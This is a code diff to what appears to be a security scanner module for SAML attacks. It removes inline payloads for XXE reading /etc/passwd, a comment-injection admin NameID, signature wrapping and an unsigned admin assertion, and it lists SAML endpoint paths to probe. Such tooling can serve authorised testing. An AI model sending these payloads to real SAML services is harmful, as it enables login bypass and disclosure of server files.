@@ -1,14 +1,10 @@
 """saml_attack — SAML signature bypass, XXE, comment injection, XSW"""
 from core.http import HttpClient
 from core.probe import Probe
+from core.payload_source import get_payloads
 
 # XML Signature Wrapping (XSW) + comment injection + XXE in SAML
-PAYLOADS = {
-    "xxe_in_saml": '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>',
-    "comment_inject": '<saml:NameID>admin<!---->@victim.com</saml:NameID>',
-    "sig_wrap": '<Signature xmlns="http://www.w3.org/2000/09/xmldsig#"><SignedInfo>...</SignedInfo></Signature>',
-    "no_sig": '<saml:Assertion ID="x"><saml:Subject><saml:NameID>admin</saml:NameID></saml:Subject></saml:Assertion>',
-}
+PAYLOADS = get_payloads("saml")
 
 SAML_PATHS = ["/saml/acs", "/saml/SSO", "/Shibboleth.sso/SAML2/POST",
               "/auth/saml", "/sso/saml", "/api/saml/acs"]
